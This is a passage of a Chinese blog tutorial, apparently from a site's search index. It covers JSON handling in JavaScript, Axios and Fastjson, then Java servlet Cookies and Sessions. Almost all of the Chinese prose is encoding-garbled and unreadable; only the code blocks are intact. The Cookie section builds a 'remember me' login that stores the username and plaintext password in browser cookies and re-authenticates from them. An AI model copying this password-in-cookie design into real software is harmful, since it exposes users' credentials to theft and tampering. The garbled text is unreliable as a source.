é€»è¾‘å€¼ï¼ˆtrueæˆ–è€…falseï¼‰\n\n- æ•°ç»„ï¼ˆåœ¨æ–¹æ‹¬å·ä¸­ï¼‰\n\n- å¯¹è±¡ï¼ˆåœ¨èŠ±æ‹¬å·ä¸­ï¼‰\n\n```javascript\nvar jsonStr = '{\"name\":\"Tom\",\"age\":23,\"addr\":[\"åŒ—äº¬\",\"ä¸Šæµ·\",\"è¥¿å®‰\"],\"user\":{\"id\":1,\"username\":\"Tom\"},\"flag\":true}'\n```\n\n### Jsonå’ŒJSå¯¹è±¡ç›¸äº’è½¬æ¢\n\nå¦‚æœæ˜¯ä¸€ä¸ª JS å¯¹è±¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ `JSå¯¹è±¡.å±æ€§å` çš„æ–¹å¼æ¥è·å–æ•°æ®ã€‚\n\nJS æä¾›äº†ä¸€ä¸ªå¯¹è±¡ JSON ï¼Œè¯¥å¯¹è±¡æœ‰å¦‚ä¸‹ä¸¤ä¸ªæ–¹æ³•\n\n| æ–¹æ³•           | ä½œç”¨                   | ä½¿ç”¨æ–¹æ³•                               |\n| -------------- | ---------------------- | -------------------------------------- |\n| parse(str)     | å°† JSON è½¬æ¢ä¸º JS å¯¹è±¡ | var jsObject = JSON.parse(jsonStr);    |\n| stringify(obj) | å°† JS å¯¹è±¡è½¬æ¢ä¸º JSON  | var jsonStr = JSON.stringify(jsObject) |\n\n```javascript\n<script>\n  //1. å®šä¹‰JSONå­—ç¬¦ä¸²\n  var jsonStr = '{\"name\":\"Tom\",\"age\":23,\"addr\":[\"åŒ—äº¬\",\"ä¸Šæµ·\",\"è¥¿å®‰\"]}'\n  alert(jsonStr);\n  //2. å°† JSON å­—ç¬¦ä¸²è½¬ä¸º JS å¯¹è±¡\n  let jsObject = JSON.parse(jsonStr);\n  alert(jsObject)\n  alert(jsObject.name)\n  //3. å°† JS å¯¹è±¡è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²\n  let jsonStr2 = JSON.stringify(jsObject);\n\talert(jsonStr2)\n</script>\n```\n\n### Axioså‘é€Jsonæ•°æ®\n\næå‰å®šä¹‰ä¸€ä¸ª js å¯¹è±¡ï¼Œç”¨æ¥å°è£…éœ€è¦æäº¤çš„å‚æ•°ï¼Œç„¶åä½¿ç”¨ JSON.stringify(jså¯¹è±¡) è½¬æ¢ä¸º JSON ï¼Œå†å°†è¯¥ JSON ä½œä¸º axios çš„ data å±æ€§å€¼è¿›è¡Œè¯·æ±‚å‚æ•°çš„æäº¤ã€‚\n\n```javascript\nvar jsObject = {name:\"å¼ ä¸‰\"};\naxios({\n  method:\"post\",\n  url:\"http://localhost:8080/ajax-demo/axiosServlet\",\n  data: JSON.stringify(jsObject)\n  }).then(function (resp) {\n  alert(resp.data);\n})\n```\n\nè€Œ axios æ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„å·¥å…·ã€‚åªéœ€è¦å°†éœ€è¦æäº¤çš„å‚æ•°å°è£…æˆ JS å¯¹è±¡ï¼Œå¹¶å°†è¯¥ JS å¯¹è±¡ä½œä¸º axios çš„ data å±æ€§å€¼ï¼Œå®ƒä¼šè‡ªåŠ¨å°† JS å¯¹è±¡è½¬æ¢ä¸º JSON è¿›è¡Œæäº¤ã€‚\n\n```javascript\nvar jsObject = {name:\"å¼ ä¸‰\"};\naxios({\n    method:\"post\",\n    url:\"http://localhost:8080/ajax-demo/axiosServlet\",\n    data:jsObject //è¿™é‡Œ axios ä¼šå°†è¯¥jså¯¹è±¡è½¬æ¢ä¸º json \n    }).then(function (resp) {\n    alert(resp.data);\n})\n```\n\n### Jsonå’ŒJavaå¯¹è±¡ç›¸äº’è½¬æ¢\n\n#### Fastjsonä»‹ç»\n\nFastjson æ˜¯é˜¿é‡Œå·´å·´æä¾›çš„ä¸€ä¸ª Java è¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½åŠŸèƒ½å®Œå–„çš„ JSON åº“ï¼Œæ˜¯ç›®å‰ Java è¯­è¨€ä¸­æœ€å¿«çš„ JSON åº“ï¼Œå¯ä»¥å®ç° Java å¯¹è±¡å’Œ JSON å­—ç¬¦ä¸²çš„ç›¸äº’è½¬æ¢ã€‚\n\n#### Fastjsonä½¿ç”¨\n\n1ã€å¯¼å…¥ä¾èµ–\n\n```xml\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>fastjson</artifactId>\n  <version>1.2.62</version>\n</dependency>\n```\n\n2ã€Javaå¯¹è±¡è½¬JSON\n\nå°† Java å¯¹è±¡è½¬æ¢ä¸º JSON ï¼Œåªéœ€è¦ä½¿ç”¨ Fastjson æä¾›çš„ JSON ç±»ä¸­çš„ toJSONString() é™æ€æ–¹æ³•å³å¯ã€‚\n\n```java\nString jsonStr = JSON.toJSONString(obj);\n```\n\n3ã€JSONå­—ç¬¦ä¸²è½¬Javaå¯¹è±¡\n\nå°† JSON è½¬æ¢ä¸º Java å¯¹è±¡ï¼Œåªéœ€è¦ä½¿ç”¨ Fastjson æä¾›çš„ JSON ç±»ä¸­çš„ parseObject() é™æ€æ–¹æ³•å³å¯ã€‚\n\n```java\nUser user = JSON.parseObject(jsonStr, User.class);\n```\n\n4ã€æµ‹è¯•\n\n```java\npublic class User {\n    private int id;\n    private String username;\n    private String Password;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n    public void setPassword(String password) {\n        Password = password;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public String getPassword() {\n        return Password;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", username='\" + username + '\\'' +\n                \", Password='\" + Password + '\\'' +\n                '}';\n    }\n}\n\n```\n\n```java\npublic class FastJsonDemo {\n    public static void main(String[] args) {\n        \n        User user = new User();\n        user.setId(1);\n        user.setUsername(\"Tom\");\n        user.setPassword(\"123\");\n        System.out.println(\"åˆå§‹userå¯¹è±¡ï¼š\"+user);\n      \n        //1. å°†Javaå¯¹è±¡è½¬ä¸ºJSONå­—ç¬¦ä¸²\n        String jsonString = JSON.toJSONString(user);\n        System.out.println(\"è½¬æ¢æˆjsonï¼š\"+jsonString);\n\n        //2. å°†JSONå­—ç¬¦ä¸²è½¬ä¸ºJavaå¯¹è±¡\n        User u = JSON.parseObject(jsonString, User.class);\n        System.out.println(\"å†è½¬æ¢æˆuserå¯¹è±¡ï¼š\"+u);\n    }\n}\n\n/**\nåˆå§‹userå¯¹è±¡ï¼šUser{id=1, username='Tom', Password='123'}\nè½¬æ¢æˆjsonï¼š{\"id\":1,\"password\":\"123\",\"username\":\"Tom\"}\nå†è½¬æ¢æˆuserå¯¹è±¡ï¼šUser{id=1, username='Tom', Password='123'}\n**/\n```\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JS"],"categories":["JavaWeb"]},{"title":"Cookie & Session","url":"/posts/37985.html","content":"\nHTTP åè®®æ˜¯ä¸€ç§`æ— çŠ¶æ€åè®®`ï¼Œå³æ¯æ¬¡æœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ï¼Œéƒ½æ˜¯ä¸€ä¸ªå…¨æ–°çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¹¶ä¸çŸ¥é“å®¢æˆ·ç«¯çš„å†å²è¯·æ±‚è®°å½•ã€‚Cookie å’Œ Session  çš„ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºäº†å¼¥è¡¥ HTTP çš„æ— çŠ¶æ€ç‰¹æ€§ã€‚\n\n## Cookie\n\n### ä»€ä¹ˆæ˜¯Cookieï¼Ÿ\n\nCookie æ˜¯ä¸€ç§**æœåŠ¡ç«¯äº§ç”Ÿ**ä½†**å­˜å‚¨åœ¨å®¢æˆ·ç«¯**ç”¨äºè®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ã€‚\n\n### Cookieå·¥ä½œåŸç†\n\n- **å®¢æˆ·ç«¯é¦–æ¬¡è¯·æ±‚æœåŠ¡å™¨**ï¼šå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨ response å‘å®¢æˆ·ç«¯é¢å‘ä¸€ä¸ª Cookieï¼Œå®¢æˆ·ç«¯ä¼šæŠŠ Cookie ä¿å­˜èµ·æ¥ï¼›\n- **å®¢æˆ·ç«¯å†æ¬¡è¯·æ±‚æœåŠ¡å™¨**ï¼šå®¢æˆ·ç«¯ä¼šæŠŠè¯·æ±‚è¿åŒè¯¥ Cookie ä¸€åŒæäº¤ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ£€æŸ¥è¯¥ Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚\n\n| é¦–æ¬¡è¯·æ±‚                                                     | å†æ¬¡è¯·æ±‚                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/v2-85622297a93f493c891ffb90b67fd5e0_b.png) | ![](https://img.jwt1399.top/img/v2-1f49734871c5e2da2d264d28ac310a65_b.png) |\n\n**é¦–æ¬¡è¯·æ±‚**\n\n- â‘ request \n\n```http\nGET /reader/ HTTP/1.1\nHost: jwt1399.top\n```\n\n- â‘¡response\n\n```http\nHTTP/1.1 200 OK\nDate: Thu, 12 Jul 2021 07:12:20 GMT\nServer: Apache\nï¼œSet-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMTï¼\nContent-Type: text/plain; charset=UTF-8\n```\n\n**å†æ¬¡è¯·æ±‚**\n\n- â‘¢request \n\n```http\nGET /image/ HTTP/1.1\nHost: jwt1399.top\nCookie: sid=1342077140226724\n```\n\n### Cookieçš„é¦–éƒ¨å­—æ®µ\n\n| é¦–éƒ¨å­—æ®µå | é¦–éƒ¨ç±»å‹     | è¯´æ˜                           |\n| ---------- | ------------ | ------------------------------ |\n| Set-Cookie | å“åº”é¦–éƒ¨å­—æ®µ | å¼€å§‹çŠ¶æ€ç®¡ç†æ‰€ä½¿ç”¨çš„Cookieä¿¡æ¯ |\n| Cookie     | è¯·æ±‚é¦–éƒ¨å­—æ®µ | æœåŠ¡å™¨æ¥æ”¶åˆ°çš„Cookieä¿¡æ¯       |\n\n### Set-Cookieå±æ€§\n\n| å±æ€§     | è¯´æ˜                                                         |\n| -------- | ------------------------------------------------------------ |\n| name     | Cookieçš„åç§°ã€‚Cookieä¸€æ—¦åˆ›å»ºï¼Œåç§°ä¾¿ä¸å¯æ›´æ”¹                 |\n| value    | Cookieçš„å€¼ã€‚å¦‚æœå€¼ä¸ºUnicodeå­—ç¬¦ï¼Œéœ€è¦ä¸ºå­—ç¬¦ç¼–ç ã€‚å¦‚æœä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œåˆ™éœ€è¦ä½¿ç”¨base64ç¼–ç  |\n| expires  | Cookieçš„æœ‰æ•ˆæœŸ(Cookieè¢«åˆ é™¤æ—¶çš„æ—¶é—´æˆ³)ã€‚æ ¼å¼ä¸ºGMTï¼Œè‹¥è®¾ç½®ä¸ºä»¥å‰çš„æ—¶é—´ï¼Œåˆ™è¯¥Cookieç«‹åˆ»è¢«åˆ é™¤ï¼Œå¹¶ä¸”è¯¥æ—¶é—´æˆ³æ˜¯æœåŠ¡å™¨æ—¶é—´ï¼Œä¸æ˜¯æœ¬åœ°æ—¶é—´ï¼è‹¥ä¸æ˜ç¡®æŒ‡å®šåˆ™é»˜è®¤ä¸ºæµè§ˆå™¨å…³é—­å‰ä¸ºæ­¢ã€‚ |\n| path     | Cookieçš„ä½¿ç”¨è·¯å¾„ã€‚è‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨çš„æ–‡ä»¶ç›®å½•         |\n| domain   | å¯ä»¥è®¿é—®è¯¥Cookieçš„åŸŸåã€‚å¦‚æœè®¾ç½®ä¸ºâ€œ.google.comâ€ï¼Œåˆ™æ‰€æœ‰ä»¥â€œgoogle.comâ€ç»“å°¾çš„åŸŸåéƒ½å¯ä»¥è®¿é—®è¯¥Cookieã€‚æ³¨æ„ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»ä¸ºâ€œ.â€ |\n| secure   | ä»…åœ¨HTTPS å®‰å…¨é€šä¿¡æ—¶æ‰ä¼šå‘é€Cookieï¼Œé»˜è®¤ä¸ºfalse              |\n| HttpOnly | åŠ ä»¥é™åˆ¶ï¼Œä½¿Cookieä¸èƒ½è¢«JavaScript è„šæœ¬è®¿é—®                  |\n| maxAge   | Cookieå¤±æ•ˆçš„æ—¶é—´ï¼Œå•ä½ç§’ã€‚å¦‚æœä¸ºæ­£æ•°ï¼Œåˆ™è¯¥Cookieåœ¨maxAgeç§’åå¤±æ•ˆã€‚å¦‚æœä¸ºè´Ÿæ•°ï¼Œè¯¥Cookieä¸ºä¸´æ—¶Cookieï¼Œå…³é—­æµè§ˆå™¨å³å¤±æ•ˆï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šä»¥ä»»ä½•å½¢å¼ä¿å­˜è¯¥Cookieã€‚å¦‚æœä¸º0ï¼Œè¡¨ç¤ºåˆ é™¤è¯¥Cookieã€‚é»˜è®¤ä¸º-1 |\n| Size     | Cookieçš„å¤§å°ã€‚åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­ï¼Œä»»ä½•Cookieå¤§å°è¶…è¿‡é™åˆ¶éƒ½è¢«å¿½ç•¥ï¼Œä¸”æ°¸è¿œä¸ä¼šè¢«è®¾ç½®ã€‚å„ä¸ªæµè§ˆå™¨å¯¹Cookieçš„æœ€å¤§å€¼å’Œæœ€å¤§æ•°ç›®æœ‰ä¸åŒçš„é™åˆ¶ |\n| SameSite | ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚å®ƒæœ‰3ä¸ªå±æ€§ï¼Œåˆ†åˆ«æ˜¯ï¼šStrictï¼ŒLaxï¼ŒNone |\n| Priority | ä¼˜å…ˆçº§ï¼Œchromeçš„ææ¡ˆï¼Œå®šä¹‰äº†ä¸‰ç§ä¼˜å…ˆçº§ï¼ŒLow/Medium/Highï¼Œå½“cookieæ•°é‡è¶…å‡ºæ—¶ï¼Œä½ä¼˜å…ˆçº§çš„cookieä¼šè¢«ä¼˜å…ˆæ¸…é™¤ã€‚ |\n| comment  | Cookieçš„ç”¨å¤„è¯´æ˜ï¼Œæµè§ˆå™¨æ˜¾ç¤ºCookieä¿¡æ¯çš„æ—¶å€™æ˜¾ç¤ºè¯¥è¯´æ˜       |\n| version  | Cookieä½¿ç”¨çš„ç‰ˆæœ¬å·ã€‚0è¡¨ç¤ºéµå¾ªNetscapeçš„Cookieè§„èŒƒï¼Œ1è¡¨ç¤ºéµå¾ªW3Cçš„RFC 2109è§„èŒƒ |\n\n### å®ä¾‹æµ‹è¯•\n\næˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹æ¥çœ‹çœ‹ï¼š\n\n```java\nCookie cookie = new Cookie(\"test\", \"yyds\");\nresp.addCookie(cookie);\nresp.sendRedirect(\"time\");\n```\n\n```java\nfor (Cookie cookie : req.getCookies()) {\n    System.out.println(cookie.getName() + \": \" + cookie.getValue());\n}\n```\n\næˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸€ä¸‹ï¼Œåœ¨`HttpServletResponse`ä¸­æ·»åŠ Cookieä¹‹åï¼Œæµè§ˆå™¨çš„å“åº”å¤´ä¸­ä¼šåŒ…å«ä¸€ä¸ª`Set-Cookie`å±æ€§ï¼ŒåŒæ—¶ï¼Œåœ¨é‡å®šå‘ä¹‹åï¼Œæˆ‘ä»¬çš„è¯·æ±‚å¤´ä¸­ï¼Œä¼šæºå¸¦æ­¤Cookieä½œä¸ºä¸€ä¸ªå±æ€§ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡`HttpServletRequest`æ¥å¿«é€Ÿè·å–æœ‰å“ªäº›Cookieä¿¡æ¯ã€‚\n\n![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.uml.org.cn%2Fxjs%2Fimages%2F2019032226.jpg&refer=http%3A%2F%2Fwww.uml.org.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1640427806&t=a452f8b27a0769ca82d2269664e71a5e)\n\n\n\næœ€å…³é”®çš„å…¶å®æ˜¯`name`ã€`value`ã€`maxAge`ã€`domain`å±æ€§ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬æ¥å°è¯•ä¿®æ”¹ä¸€ä¸‹maxAgeæ¥çœ‹çœ‹å¤±æ•ˆæ—¶é—´ï¼š\n\n```java\ncookie.setMaxAge(20);\n```\n\nè®¾å®šä¸º20ç§’ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œå“åº”å¤´ä¸ºæˆ‘ä»¬è®¾å®šäº†20ç§’çš„è¿‡æœŸæ—¶é—´ã€‚20ç§’å†…è®¿é—®éƒ½ä¼šæºå¸¦æ­¤Cookieï¼Œè€Œè¶…è¿‡20ç§’ï¼ŒCookieæ¶ˆå¤±ã€‚\n\næ—¢ç„¶äº†è§£äº†Cookieçš„ä½œç”¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä½¿ç”¨Cookieæ¥å®ç°è®°ä½æˆ‘åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·åå’Œå¯†ç å…¨éƒ¨ä¿å­˜åœ¨Cookieä¸­ï¼Œå¦‚æœè®¿é—®æˆ‘ä»¬çš„é¦–é¡µæ—¶æºå¸¦äº†è¿™äº›Cookieï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¸ºç”¨æˆ·è¿›è¡Œç™»é™†ï¼Œå¦‚æœç™»é™†æˆåŠŸåˆ™ç›´æ¥è·³è½¬åˆ°é¦–é¡µï¼Œå¦‚æœç™»é™†å¤±è´¥ï¼Œåˆ™æ¸…ç†æµè§ˆå™¨ä¸­çš„Cookieã€‚\n\né‚£ä¹ˆé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆåœ¨å‰ç«¯é¡µé¢çš„è¡¨å•ä¸­æ·»åŠ ä¸€ä¸ªå‹¾é€‰æ¡†ï¼š\n\n```html\n<div>\n    <label>\n        <input type=\"checkbox\" placeholder=\"è®°ä½æˆ‘\" name=\"remember-me\">\n        è®°ä½æˆ‘\n    </label>\n</div>\n```\n\næ¥ç€ï¼Œæˆ‘ä»¬åœ¨ç™»é™†æˆåŠŸæ—¶è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç”¨æˆ·å‹¾é€‰äº†è®°ä½æˆ‘ï¼Œé‚£ä¹ˆå°±è®²Cookieå­˜å‚¨åˆ°æœ¬åœ°ï¼š\n\n```java\nif(map.containsKey(\"remember-me\")){   //è‹¥å‹¾é€‰äº†å‹¾é€‰æ¡†ï¼Œé‚£ä¹ˆä¼šæ­¤è¡¨å•ä¿¡æ¯\n    Cookie cookie_username = new Cookie(\"username\", username);\n    cookie_username.setMaxAge(30);\n    Cookie cookie_password = new Cookie(\"password\", password);\n    cookie_password.setMaxAge(30);\n    resp.addCookie(cookie_username);\n    resp.addCookie(cookie_password);\n}\n```\n\nç„¶åï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹é»˜è®¤çš„è¯·æ±‚åœ°å€ï¼Œç°åœ¨ä¸€å¾‹é€šè¿‡`http://localhost:8080/yyds/login`è¿›è¡Œç™»é™†ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ·»åŠ GETè¯·æ±‚çš„ç›¸å…³å¤„ç†ï¼š\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Cookie[] cookies = req.getCookies();\n    if(cookies != null){\n        String username = null;\n        String password = null;\n        for (Cookie cookie : cookies) {\n            if(cookie.getName().equals(\"username\")) username = cookie.getValue();\n            if(cookie.getName().equals(\"password\")) password = cookie.getValue();\n        }\n        if(username != null && password != null){\n            //ç™»é™†æ ¡éªŒ\n            try (SqlSession sqlSession = factory.openSession(true)){\n                UserMapper mapper = sqlSession.getMapper(UserMapper.class);\n                User user = mapper.getUser(username, password);\n                if(user != null){\n                    resp.sendRedirect(\"time\");\n                    return;   //ç›´æ¥è¿”å›\n                }\n            }\n        }\n    }\n    req.getRequestDispatcher(\"/\").forward(req, resp);   //æ­£å¸¸æƒ…å†µè¿˜æ˜¯è½¬å‘ç»™é»˜è®¤çš„Servletå¸®æˆ‘ä»¬è¿”å›é™æ€é¡µé¢\n}\n```\n\nç°åœ¨ï¼Œ30ç§’å†…éƒ½ä¸éœ€è¦ç™»é™†ï¼Œè®¿é—®ç™»é™†é¡µé¢åï¼Œä¼šç›´æ¥è·³è½¬åˆ°timeé¡µé¢ã€‚\n\nç°åœ¨å·²ç»ç¦»æˆ‘ä»¬ç†æƒ³çš„é¡µé¢è¶Šæ¥è¶Šæ¥è¿‘äº†ï¼Œä½†æ˜¯ä»ç„¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬çš„é¦–é¡µï¼Œæ— è®ºæ˜¯å¦ç™»é™†ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥è®¿é—®ï¼Œé‚£ä¹ˆï¼Œå¦‚ä½•æ‰å¯ä»¥å®ç°åªæœ‰ç™»é™†ä¹‹åæ‰èƒ½è®¿é—®å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°Sessionäº†ã€‚\n\n### Cookieç¼ºç‚¹\n\n- Cookie åœ¨ HTTP æ¶ˆæ¯ä¸­æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œæ²¡æœ‰åŠ å¯†\n- Cookie å­˜å‚¨äºæµè§ˆå™¨ï¼Œå¯ä»¥è¢«ç¯¡æ”¹å’Œæ”»å‡»\n- Cookie å¤§å°å—åˆ°é™åˆ¶ï¼ˆé€šå¸¸é™åˆ¶ä¸º50 ä¸ªï¼Œæ¯ä¸ªä¸è¶…è¿‡4KBï¼‰\n\n## Session\n\n### ä»€ä¹ˆæ˜¯Sessionï¼Ÿ\n\nSession æ˜¯ä¸€ç§**å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯**ç”¨äºè®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ã€‚\n\n### Sessionå·¥ä½œåŸç†\n\n- **å®¢æˆ·ç«¯é¦–æ¬¡è¯·æ±‚æœåŠ¡å™¨**ï¼šæœåŠ¡å™¨ç«¯ä¼šç”Ÿæˆä¸€ä¸ª Session ID è‡ªå·±å…ˆä¿å­˜ä¸‹æ¥ï¼Œå†å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°åä¼šå°†å®ƒä¿å­˜åœ¨ Cookie ä¸­\n- **å®¢æˆ·ç«¯å†æ¬¡è¯·æ±‚æœåŠ¡å™¨**ï¼šå®¢æˆ·ç«¯ä¼šæŠŠè¯·æ±‚è¿åŒè¯¥ Session ID ä¸€åŒæäº¤ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ£€æŸ¥è¯¥ Session IDï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚\n\n![](https://img.jwt1399.top/img/v2-0b02fa4a73a8072eb03cdf78270235e1_b.png)\n\n### sessionçš„ç”Ÿå‘½å‘¨æœŸ\n\n**Sessionä½•æ—¶ç”Ÿæ•ˆï¼š**\n\nSession åœ¨ç”¨æˆ·è®¿é—®é¦–æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶åˆ›å»ºï¼Œéœ€è¦æ³¨æ„åªæœ‰è®¿é—®JSPã€Servletç­‰ç¨‹åºæ—¶æ‰ä¼šåˆ›å»ºSessionï¼Œåªè®¿é—® HTMLã€IMAG ç­‰é™æ€èµ„æºå¹¶ä¸ä¼šåˆ›å»º Sessionï¼Œå¯è°ƒç”¨ request.getSession(true) å¼ºåˆ¶ç”Ÿæˆ Session\n\n**Sessionä½•æ—¶å¤±æ•ˆï¼š**\n\næœåŠ¡å™¨ä¼šæŠŠé•¿æ—¶é—´æ²¡æœ‰æ´»åŠ¨çš„ Session ä»æœåŠ¡å™¨å†…å­˜ä¸­æ¸…é™¤ï¼Œæ­¤æ—¶ Session ä¾¿å¤±æ•ˆã€‚Tomcat ä¸­Session çš„é»˜è®¤å¤±æ•ˆæ—¶é—´ä¸º 30 åˆ†é’Ÿã€‚\n\n### å®ä¾‹æµ‹è¯•\n\né‚£ä¹ˆç°åœ¨ï¼Œæˆ‘ä»¬åœ¨ç”¨æˆ·ç™»å½•æˆåŠŸä¹‹åï¼Œå°†ç”¨æˆ·å¯¹è±¡æ·»åŠ åˆ°Sessionä¸­ï¼Œåªè¦æ˜¯æ­¤ç”¨æˆ·å‘èµ·çš„è¯·æ±‚ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä»`HttpSession`ä¸­è¯»å–åˆ°å­˜å‚¨åœ¨ä¼šè¯ä¸­çš„æ•°æ®ï¼š\n\n```java\nHttpSession session = req.getSession();\nsession.setAttribute(\"user\", user);\n```\n\nåŒæ—¶ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»å½•å°±å»è®¿é—®é¦–é¡µï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å‘é€ä¸€ä¸ªé‡å®šå‘è¯·æ±‚ï¼Œå‘Šè¯‰ç”¨æˆ·ï¼Œéœ€è¦å…ˆè¿›è¡Œç™»å½•æ‰å¯ä»¥è®¿é—®ï¼š\n\n```java\nHttpSession session = req.getSession();\nUser user = (User) session.getAttribute(\"user\");\nif(user == null) {\n    resp.sendRedirect(\"login\");\n    return;\n}\n```\n\nåœ¨è®¿é—®çš„è¿‡ç¨‹ä¸­ï¼Œæ³¨æ„è§‚å¯ŸCookieå˜åŒ–ã€‚\n\nSessionå¹¶ä¸æ˜¯æ°¸è¿œéƒ½å­˜åœ¨çš„ï¼Œå®ƒæœ‰ç€è‡ªå·±çš„è¿‡æœŸæ—¶é—´ï¼Œé»˜è®¤æ—¶é—´ä¸º30åˆ†é’Ÿï¼Œè‹¥è¶…è¿‡æ­¤æ—¶é—´ï¼ŒSessionå°†ä¸¢å¤±ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹è¿‡æœŸæ—¶é—´ï¼š\n\n```xml\n<session-config>\n    <session-timeout>1</session-timeout>\n</session-config>\n```\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨`invalidate`æ–¹æ³•æ¥ä½¿Sessionç«‹å³å¤±æ•ˆï¼š\n\n```java\nsession.invalidate();\n```\n\nç°åœ¨ï¼Œé€šè¿‡Sessionï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´å¥½åœ°æ§åˆ¶ç”¨æˆ·å¯¹äºèµ„æºçš„è®¿é—®ï¼Œåªæœ‰å®Œæˆç™»é™†çš„ç”¨æˆ·æ‰æœ‰èµ„æ ¼è®¿é—®é¦–é¡µã€‚\n\n### Sessionç¼ºç‚¹\n\n- åŸºäº Cookie çš„æœºåˆ¶å®¹æ˜“è¢« CSRF\n- å¦‚æœæ˜¯åˆ†å¸ƒå¼éƒ¨ç½²ï¼Œéœ€è¦åšå¤šæœºå…±äº« Session æœºåˆ¶\n- å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼Œå ç”¨èµ„æº\n\n## ä¸¤è€…å¯¹æ¯”\n\n- Cookie æœºåˆ¶æ˜¯é€šè¿‡**æ£€æŸ¥å®¢æˆ·èº«ä¸Šçš„â€œé€šè¡Œè¯â€**æ¥ç¡®è®¤å®¢æˆ·èº«ä»½\n\n- Session æœºåˆ¶æ˜¯é€šè¿‡**æ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„â€œå®¢æˆ·æ˜ç»†è¡¨â€**æ¥ç¡®è®¤å®¢æˆ·èº«ä»½\n\n|          | Cookie   | Session    |\n| -------- | -------- | ---------- |\n| å­˜å‚¨ä½ç½® | å®¢æˆ·ç«¯   | æœåŠ¡ç«¯     |\n| å­˜å‚¨å¤§å° | 